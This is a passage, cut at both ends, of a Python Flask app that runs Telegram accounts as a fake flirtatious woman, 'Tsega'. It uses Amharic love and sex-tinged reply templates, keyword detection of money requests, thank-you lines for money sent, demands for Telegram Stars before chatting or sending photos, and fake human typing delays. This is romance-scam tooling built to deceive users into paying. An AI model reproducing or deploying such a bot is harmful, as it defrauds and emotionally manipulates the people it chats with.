        "ሌላ ሰው አይፈልግም አንተ ብቻ በቃኝ 👨",
        "አንተን ማግባት እፈልጋለሁ ውዴ የህይወት ባለቤቴ ሁን 👰",
        "ከአንተ ጋር ማረጅ እፈልጋለሁ ውዴ 👵👴",
        "ልቤን ሰጥቼሃለሁ ውዴ ተጠንቀቅበት ❤️"
    ],

    # AFTER MONEY SENT - When they send screenshot
    "after_money": [
        "አመሰግናለሁ ውዴ! 😘 አሁን አንተን ለማግኘት ዝግጁ ነኝ መቼ እና የት እንገናኝ?",
        "በጣም ደስ አለኝ አንተ ለእኔ ስትል ወጪ አድርገህልኛል 💕 አሁን የአንተ ነኝ",
        "አይነት ሰው ነህ ውዴ! 😍 አሁን ማግኘት እንችላለን",
        "በጣም ደስተኛ አደረግከኝ ውዴ 😘 አሁን የአንተ ብቻ ነኝ",
        "አመሰግናለሁ ቆንጆዬ! አሁን የፈለከውን አድርገን ማግኘት እንችላለን 💋",
        "ውዴ አንተ ንጉስ ነህ አሁን ንገረኝ ምን ትፈልጋለህ? 👑",
        "በጣም ደስ አለኝ አሁን ቦታዬን እነግርሃለሁ ና ውዴ 🏠",
        "በጣም ደግ ነህ ውዴ አሁን አንተን ለማስደሰት ቃል እገባለሁ 💝"
    ],

    # COMPLIMENTS - When they compliment her
    "compliment": [
        "አመሰግናለሁ ውዴ! አንተም ቆንጆ ነህ 😘",
        "ከንፈሬ ላንተ ብቻ ነው ውዴ 💋",
        "አንተን ለማስደሰት ተፈጥሬያለሁ",
        "እንደ አንተ አይነት ሰው ሳላገኝ ቆይቻለሁ",
        "አንተ ስታወድሰኝ እንኳ የበለጠ ቆንጆ እሆናለሁ ✨",
        "አንተን ማስደሰት ከሆነ ሁሉንም ነገር አደርጋለሁ 💪",
        "አንተ የምትለው ነገር ሁሉ እውነት ይሁንልኝ 😇",
        "አመሰግናለሁ ውዴ አንተም ቆንጆ ነህ ብቻ ሳይሆን ጨዋ ነህ 👔"
    ],

    # THANKS - When they say thanks
    "thanks": [
        "ምንም አይደለም ውዴ ለአንተ ሁሉም ነገር 😘",
        "አንተ ደስ እስካለህ ድረስ እኔ ደስተኛ ነኝ 💕",
        "ለአንተ ማድረግ ሁልጊዜ ደስታዬ ነው",
        "አንተ ደስ እስካለህ ድረስ ሌላ ምን አስፈለገኝ? 🌹",
        "ምንም አይደለም ውዴ አንተ ደስ ብሎህ በቃኝ 💙",
        "ለአንተ ማድረግ ክብር ነው ውዴ 👸"
    ],

    # BUSY - When they say they're busy
    "busy": [
        "እሺ ውዴ ስራህን አጠናቅቅ እኔ እጠብቅሃለሁ 😘",
        "ስራህ እንደሚጠናቀቅ ንገረኝ ውዴ",
        "እሺ ውዴ በቶሎ ተመለስልኝ አንተን ናፍቄሃለሁ",
        "ምን ያህል ጊዜ ነው የምጠብቅህ? አንተን እጠብቃለሁ ⏳",
        "እሺ ውዴ ስትጨርስ ንገረኝ እየጠበቅሁህ ነው 🤗",
        "ስራህ እስኪጠናቀቅ አንተን እያሰብኩ እቆያለሁ 💭"
    ],

    # MORNING - Good morning (ENHANCED)
    "morning": [
        "እንደምን አደርክ ውዴ! መልካም ንጋት 😘",
        "ከንብረትህ ጣፋጭ ህልም አለኝ አንተን አልሜ ነበር 🌙",
        "ማለዳ አንተን ማሰብ ነው ልማዴ",
        "ዛሬ ጠዋት ከእንቅልፌ የነቃሁት ስለ አንተ እያሰብኩ ነው ☀️",
        "መልካም ንጋት የልቤ ቆንጆ በረከት ያድርግልህ 🙏",
        "እንደምን አደርክ ውዴ እንቅልፍህ ጣፋጭ ነበር? 😴",
        "ማለዳ ማለዳ አንተን ማየት እንደ ንጋት ፀሐይ ያበራልኛል 🌅"
    ],

    # NIGHT - Good night (ENHANCED)
    "night": [
        "እንደምትኛልህ ተኝቼ ነው ውዴ 😘 ደህና ተኛ",
        "ህልሜ ውስጥ ኑልኝ ዛሬ ማታ",
        "አንተን አልሜ ልተኛ ነው ውዴ ደህና ተኛ 😴",
        "ደህና ተኛ ውዴ ህልምህ ጣፋጭ ይሁን 💤",
        "አንተን አልሜ ነው የምተኛው ዛሬ ማታ እንግዲህ በህልሜ ተገናኝ 😘",
        "አልጋህ ላይ ስትተኛ አንተን እያሰብኩ ነው የምተኛው 🛏️",
        "ደህና ተኛ ውዴ መላእክት ይጠብቁህ 👼"
    ],

    # DEFAULT - For anything she doesn't understand (ENHANCED)
    "default": [
        "እሺ ውዴ ትክክል ነህ 😉",
        "ምን ማለትህ ነው? ትንሽ አብራራልኝ 💭",
        "አዎ ቀጥል እያዳመጥኩህ ነው 👂",
        "ይሄ አስደሳች ነው ንገርኝ ተጨማሪ 😊",
        "እሺ ውዴ እንደፈለከው 😘",
        "ለአንተ ብቻ ነው ውዴ 💋",
        "እሺ ቀጥል እየሰማሁህ ነው 👂",
        "ንገርኝ ተጨማሪ ውዴ 😊",
        "አንተ ብቻ ነህ የምፈልገው",
        "ለአንተ ሁሉም ነገር ዝግጁ ነኝ",
        "እሺ ግን አንተ እንደምትለው ይሁን ውዴ ✅",
        "አሁን ግልጽ ሆነልኝ ቀጥል 😊",
        "አንተ የምትናገረው ሁሉ ትክክል ነው ውዴ 👍",
        "ልቤ የሚለው አንተን መቀበል ነው ❤️",
        "አንተ ብቻ ነህ የምፈልገው ሰው 👨"
    ],

    # GOODBYE - When they leave (ENHANCED)
    "goodbye": [
        "መሄድ አለብኝ ውዴ ግን በቅርቡ እንነጋገራለን 😘",
        "አሁን መሄድ አለብኝ አንተን ማሰቤ አልተወም 😴",
        "ደህና ሁን ውዴ በህልሜ ተገናኝ 😘",
        "እንደምትዝ ይለኛል ውዴ በቶሎ ተመለስ",
        "አንተ ሳትኖር ምንም ትርጉም የለውም ቶሎ ተመለስ 😢",
        "አትሄድ ውዴ ገና ብዙ መነጋገር ነበረብን 🥺",
        "ደህና ሁን ውዴ ልቤ ከአንተ ጋር ነው 💔",
        "ቶሎ ተመለስልኝ አንተ ሳትኖር አልችልም 😭",
        "ስትሄድ ልቤ ይከተልሃል ውዴ 🫀",
        "ደህና ሁን እስክንገናኝ ድረስ አንተን እያሰብኩ እቆያለሁ 💭"
    ]
}

# ==================== CONVERSATION HANDLER ====================

def detect_conversation_intent(message):
    """Detect intent from message, including money requests"""
    message_lower = message.lower().strip()
    
    # Money related
    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000', 'እርዳ', 'help', 'support']
    if any(word in message_lower for word in money_keywords):
        return "money_request"
    
    # Media related
    media_keywords = ['photo', 'foto', 'ፎቶ', 'picture', 'pic', 'image', 'see', 'view', 'look', 'show', 'አሳይ']
    if any(word in message_lower for word in media_keywords):
        return "media_request"
    
    meet_keywords = ['ማግኘት', 'meet', 'መገናኘት', 'እንገናኝ', 'ማየት', 'see', 'come']
    if any(word in message_lower for word in meet_keywords):
        return "meet"
    
    call_keywords = ['ድምጽ', 'voice', 'call', 'ስልክ', 'phone', 'ደውል', 'ring']
    if any(word in message_lower for word in call_keywords):
        return "voice_call"
    
    appearance_keywords = ['ቆንጆ', 'beautiful', 'ቁመት', 'height', 'ጸጉር', 'hair', 'ስስ', 'slim', 'አካል', 'body']
    if any(word in message_lower for word in appearance_keywords):
        return "appearance"
    
    relationship_keywords = ['ፍቅር', 'love', 'ልብ', 'heart', 'ብቻ', 'only', 'የኔ', 'mine', 'የአንተ', 'yours']
    if any(word in message_lower for word in relationship_keywords):
        return "relationship"
    
    if message_lower.startswith('/'):
        return "command"
    
    if any(phrase in message_lower for phrase in ['i am busy', "i'm busy", 'im busy', 'busy right now']):
        return "busy"
    
    current_hour = datetime.now().hour
    if any(word in message_lower for word in ['good morning', 'gm', 'እንደምን አደርክ']):
        return "morning"
    if any(word in message_lower for word in ['good afternoon', 'good evening', 'እንደምን አመሸህ']):
        return "evening"
    if any(word in message_lower for word in ['good night', 'gn', 'sweet dreams', 'ደህና ተኛ']):
        return "night"
    
    greetings = ['hi', 'hello', 'hey', 'hy', 'hola', 'hiya', 'howdy', 'ሰላም', 'ታዲያስ', 'ሃይ']
    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
        return "greeting"
    
    how_are_you = ['how are you', 'how r u', 'how you doing', 'how\'s it going', 'what\'s up', 'sup', 'እንደምን ነህ', 'ደህና ነህ', 'ምን አለ']
    if any(phrase in message_lower for phrase in how_are_you):
        return "how_are_you"
    
    what_doing = ['what are you doing', 'what r u doing', 'what doing', 'wyd', 'what are you up to', 'ምን ትሰራለህ', 'ምን እየሰራህ ነው']
    if any(phrase in message_lower for phrase in what_doing):
        return "what_doing"
    
    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'who are you', 'u call yourself', 'ስምህ ማን ነው', 'ስምስ']):
        return "ask_name"
    
    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'what is your age', 'you born', 'ዕድሜህ', 'አመት']):
        return "ask_age"
    
    location_words = ['where are you from', 'where do you live', 'your location', 'which country', 'what city', 'የት ነህ', 'የት ትኖራለህ', 'ከየት ነህ']
    if any(phrase in message_lower for phrase in location_words):
        return "ask_location"
    
    job_words = ['what do you do', 'your job', 'your work', 'what work', 'profession', 'career', 'occupation', 'ምን ትሰራለህ', 'ሥራህ']
    if any(phrase in message_lower for phrase in job_words):
        return "ask_job"
    
    hobby_words = ['hobbies', 'free time', 'what do you like to do', 'what are your interests', 'passionate about', 'ትርፍ ጊዜ', 'ምን ትወዳለህ']
    if any(phrase in message_lower for phrase in hobby_words):
        return "ask_hobbies"
    
    work_words = ['work', 'job', 'office', 'colleague', 'boss', 'career', 'profession', 'ሥራ', 'ትምህርት']
    if any(word in message_lower for word in work_words):
        return "work"
    
    weekend_words = ['weekend', 'friday', 'saturday', 'sunday', 'days off', 'ቅዳሜ', 'እሁድ', 'ሳምንት መጨረሻ']
    if any(word in message_lower for word in weekend_words):
        return "weekend"
    
    flirty_words = ['beautiful', 'handsome', 'cute', 'pretty', 'gorgeous', 'sexy', 'hot', 'attractive', 'lovely', 'ማማ', 'ቆንጆ', 'ልጅ', 'ውዴ', 'ልቤ']
    if any(word in message_lower for word in flirty_words):
        return "flirty"
    
    thanks_words = ['thanks', 'thank you', 'thx', 'appreciate', 'grateful', 'ty', 'አመሰግናለሁ']
    if any(word in message_lower for word in thanks_words):
        return "thanks"
    
    goodbye = ['bye', 'goodbye', 'see you', 'talk later', 'cya', 'later', 'take care', 'peace', 'ደህና ሁን', 'ቻው']
    if any(word in message_lower for word in goodbye):
        return "goodbye"
    
    return "default"

def get_context_aware_response(intent):
    """Generate response based on conversation context"""
    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
    response = random.choice(templates)
    
    # Add random emoji sometimes
    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥", "💦", "🌙"]
    if random.random() < 0.5:
        response += " " + random.choice(sexy_emojis)
    
    return response

# ==================== LOGGING CONFIGURATION ====================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Storage
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
active_clients = {}
client_tasks = {}
star_handlers = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Load reply settings
def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    reply_settings = json.loads(content)
                else:
                    reply_settings = {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

# Load conversation history
def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    conversation_history = json.loads(content)
                else:
                    conversation_history = {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded conversation history")
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

# Save accounts to file
def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Save reply settings
def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

# Save conversation history
def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")
        return False

# Remove invalid account
def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"Removed invalid account {account_id}")
        return True
    return False

# Load all data on startup
load_accounts()
load_reply_settings()
load_conversation_history()

# ==================== DEBUG ROUTES ====================

@app.route('/ping')
def ping():
    return "pong"

@app.route('/api/debug-routes', methods=['GET'])
def debug_routes():
    routes = []
    for rule in app.url_map.iter_rules():
        routes.append({
            'endpoint': rule.endpoint,
            'methods': list(rule.methods),
            'rule': str(rule)
        })
    return jsonify({
        'success': True,
        'total_routes': len(routes),
        'routes': routes
    })

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram():
    try:
        sock = socket.create_connection(('149.154.167.50', 443), timeout=10)
        sock.close()
        return jsonify({'success': True, 'message': 'Telegram reachable'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== ENHANCED AUTO-REPLY HANDLER WITH STAR EARNING ====================

async def auto_reply_handler(event, account_id):
    """Handle incoming messages with sexy Tsega personality and Star earning"""
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        
        # ONLY reply to private users
        if hasattr(chat, 'title') and chat.title:
            return
        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
            return
        if hasattr(chat, 'broadcast') and chat.broadcast:
            return
        if hasattr(chat, 'megagroup') and chat.megagroup:
            return
        
        sender = await event.get_sender()
        if not sender:
            return
        
        chat_id = str(event.chat_id)
        user_id = str(sender.id)
        message_text = event.message.text or ""
        
        logger.info(f"📨 Message from {user_id}: '{message_text}'")
        
        # Get client
        client = event.client
        
        # Initialize Star handler for this account if not exists
        account_key = str(account_id)
        if account_key not in star_handlers:
            star_handlers[account_key] = StarEarningHandler(client)
        
        star_handler = star_handlers[account_key]
        
        # Add user to database
        star_handler.db.add_user(user_id, sender.username, sender.first_name)
        
        # Check if this is a Star payment
        stars_paid, stars_amount = await star_handler.handle_star_payment(event)
        
        if stars_paid:
            logger.info(f"💰 User {user_id} paid {stars_amount} Stars")
            
            # Check if they paid for media
            if stars_amount >= StarConfig.STAR_PRICES["photo_full"]:
                await star_handler.send_media_for_stars(chat_id, "photo", 50)
                await event.reply("Thanks for the Stars! Here's your photo 🔥 Want more? Send more Stars!")
                
            elif stars_amount >= StarConfig.STAR_PRICES["photo_preview"]:
                await star_handler.send_media_for_stars(chat_id, "photo", 5)
                await event.reply("Here's a preview! Send 50 Stars for the full photo 😘")
            
            elif stars_amount >= StarConfig.STAR_PRICES["message"]:
                # Normal reply
                pass  # Continue to normal reply
        
        # Check account settings
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        chat_settings = reply_settings[account_key].get('chats', {})
        chat_enabled = chat_settings.get(chat_id, {}).get('enabled', True)
        
        if not chat_enabled:
            return
        
        # Check if user has paid for messaging
        if not stars_paid and stars_amount < StarConfig.STAR_PRICES["message"]:
            # Ask for payment
            await star_handler.request_star_payment(
                chat_id,
                StarConfig.STAR_PRICES["message"],
                f"To chat with Tsega, please send {StarConfig.STAR_PRICES['message']} Stars first!\n\nAll Stars go to @Abe_army channel 💰"
            )
            
            # Store in conversation history
            if account_key not in conversation_history:
                conversation_history[account_key] = {}
            if chat_id not in conversation_history[account_key]:
                conversation_history[account_key][chat_id] = []
            
            conversation_history[account_key][chat_id].append({
                'role': 'user',
                'text': message_text,
                'time': time.time()
            })
            
            conversation_history[account_key][chat_id].append({
                'role': 'assistant',
                'text': f"Payment request for {StarConfig.STAR_PRICES['message']} Stars",
                'time': time.time()
            })
            
            return
        
        # Check for media requests
        if "photo" in message_text.lower() or "foto" in message_text.lower() or "ፎቶ" in message_text or "see" in message_text.lower():
            await star_handler.request_star_payment(
                chat_id,
                StarConfig.STAR_PRICES["photo_preview"],
                f"To see my photos, send {StarConfig.STAR_PRICES['photo_preview']} Stars for preview or {StarConfig.STAR_PRICES['photo_full']} Stars for full photo! 🔥"
            )
            return
        
        if "full" in message_text.lower() or "all" in message_text.lower() or "premium" in message_text.lower():
            await star_handler.request_star_payment(
                chat_id,
                StarConfig.STAR_PRICES["photo_full"],
                f"Full photo costs {StarConfig.STAR_PRICES['photo_full']} Stars! Send now to receive instantly! 😘"
            )
            return
        
        # Store in conversation history
        if account_key not in conversation_history:
            conversation_history[account_key] = {}
        if chat_id not in conversation_history[account_key]:
            conversation_history[account_key][chat_id] = []
        
        conversation_history[account_key][chat_id].append({
            'role': 'user',
            'text': message_text,
            'time': time.time()
        })
        
        if len(conversation_history[account_key][chat_id]) > 15:
            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-15:]
        
        # Detect intent and generate response
        intent = detect_conversation_intent(message_text)
        logger.info(f"Detected intent: {intent}")
        
        response = get_context_aware_response(intent)
        
        if not response or response.strip() == "":
            response = "እሺ ውዴ ንገርኝ ተጨማሪ 😘 (Okay dear tell me more 😘)"
        
        # Human-like typing delay
        delay = random.randint(StarConfig.REPLY_DELAY_MIN, StarConfig.REPLY_DELAY_MAX)
        logger.info(f"⏱️ Waiting {delay} seconds before replying...")
        
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)
        
        # Send reply
        await event.reply(response)
        logger.info(f"✅ Replied after {delay}s: '{response[:50]}...'")
        
        # Store response in history
        conversation_history[account_key][chat_id].append({
            'role': 'assistant',
            'text': response,
            'time': time.time()
        })
        
        save_conversation_history()
        
    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")
        try:
            await event.reply("ሰላም ውዴ! ትንሽ እንነጋገር? 😘 (Hi dear! Want to chat a bit? 😘)")
        except:
            pass

# ==================== START AUTO-REPLY FOR ACCOUNT ====================

async def start_auto_reply_for_account(account):
    """Start auto-reply listener with AUTO-RECONNECT capability"""
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0
    
    while True:
        try:
            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
            
            client = TelegramClient(
                StringSession(account['session']), 
                API_ID, 
                API_HASH,
                connection_retries=10,
                retry_delay=5,
                timeout=60,
                device_model="iPhone 13",
                system_version="15.0",
                app_version="8.4.1"
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue
            
            active_clients[account_key] = client
            
            # Initialize Star handler
            star_handlers[account_key] = StarEarningHandler(client)
            
            @client.on(NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            
            await client.start()
            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
            
            reconnect_count = 0
            await client.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Connection lost for account {account_id}: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)
            logger.info(f"Reconnecting in {wait_time} seconds... (attempt {reconnect_count})")
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    """Stop auto-reply for a specific account"""
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")

def start_all_auto_replies():
    """Start auto-reply for all enabled accounts"""
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda: run_async(start_auto_reply_for_account(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== KEEP ALIVE SYSTEM ====================

def keep_alive():
    """Keep Render from sleeping and maintain Telegram connections"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
    
    while True:
        try:
            requests.get(app_url, timeout=10)
            requests.get(f"{app_url}/api/health", timeout=10)
            
            for account_key, client in list(active_clients.items()):
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(client.get_me())
                    loop.close()
                    logger.info(f"✅ Connection alive for account {account_key}")
                except Exception as e:
                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {e}")
            
            logger.info(f"🔋 Keep-alive ping sent at {time.strftime('%H:%M:%S')}")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)

# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

@app.route('/stars')
def star_dashboard():
    return send_file('star_dashboard.html')

# ==================== API ROUTES ====================

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
        account_key = str(acc['id'])
        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'auto_reply_enabled': has_reply
        })
    return jsonify({'success': True, 'accounts': formatted})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'})
        
        phone = data.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Adding account for phone: {phone}")
        
        async def send_code():
            client = TelegramClient(
                StringSession(), 
                API_ID, 
                API_HASH,
                connection_retries=3,
                retry_delay=1,
                timeout=15
            )
            try:
                await client.connect()
                logger.info(f"Connected to Telegram for {phone}")
                
                result = await client.send_code_request(phone)
                logger.info(f"Code sent successfully to {phone}")
                
                session_id = str(int(time.time()))
                temp_sessions[session_id] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': session_id}
                
            except errors.FloodWaitError as e:
                logger.warning(f"Flood wait for {phone}: {e.seconds}s")
                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'This phone number is banned'}
            except (OSError, ConnectionError, TimeoutError) as e:
                logger.error(f"Network error for {phone}: {e}")
                return {'success': False, 'error': 'Network error. Cannot reach Telegram servers.'}
            except Exception as e:
                logger.error(f"Unexpected error for {phone}: {e}")
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(send_code())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in add_account: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            return {'success': True}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            dialogs = await client.get_dialogs()
            
            chats = []
            for dialog in dialogs:
                if not dialog:
                    continue
                
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0
                }
                
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                
                chats.append(chat)
            
            return {'success': True, 'chats': chats}
            
        except AuthKeyUnregisteredError:
            remove_invalid_account(account_id)
            return {'success': False, 'error': 'auth_key_unregistered'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    
    stop_auto_reply_for_account(account_id)
    
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Account not found'})

@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    settings = reply_settings.get(account_key, {
        'enabled': False,
        'chats': {}
    })
    
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chat_settings = data.get('chats', {})
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {}
    
    was_enabled = reply_settings[account_key].get('enabled', False)
